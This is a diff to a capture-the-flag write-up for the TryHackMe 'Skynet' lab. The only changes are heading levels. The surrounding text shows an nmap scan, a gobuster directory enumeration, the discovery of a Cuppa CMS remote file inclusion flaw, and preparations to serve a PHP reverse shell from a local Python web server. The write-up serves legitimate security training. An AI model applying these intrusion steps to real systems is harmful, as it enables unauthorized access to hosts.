@@ -2,7 +2,7 @@
 
 Room link: https://tryhackme.com/room/skynet
 
-# Scanning 
+## Scanning 
 I started with an aggressive NMAP scan using the ```-A``` option. 
 ```
 ajread@aj-ubuntu:~/TryHackMe$ nmap -A [REDACTED]
@@ -70,7 +70,7 @@ PORT    STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 58.15 seconds
 ```
 It looked like the machine had some e-mail capabilities based on the pop and imap. It also appeared to be hosting some form of SMB share. 
-# Enumeration
+## Enumeration
 I checked out the http service and I found some interesting directories. 
 ```
 ajread@aj-ubuntu:~/TryHackMe/practice$ gobuster -u [REDACTED] -w /home/ajread/resources/wordlists/SecLists/Discovery/Web-Content/directory-list-1.0.txt 
@@ -326,7 +326,7 @@ Gobuster v2.0.1              OJ Reeves (@TheColonial)
 =====================================================
 ```
 When I navigated to the /administrator page, I was presented with a login screen for Cuppa CMS. I did some googling to find that there is a remote/local file inclusion vulnerability with Cuppa CMS (https://www.exploit-db.com/exploits/25971) that I could use. 
-# Initial Access
+## Initial Access
 With the LFI/RFI vulnerability, I set up a php reverse shell using pentest monkey (https://pentestmonkey.net/tools/web-shells/php-reverse-shell), changing the IP and port as needed. Then, I started a python http server on my local machine in the directory where the reverse shell was stored.
 ```
 ajread@aj-ubuntu:~/resources/revshells$ sudo python -m http.server 80
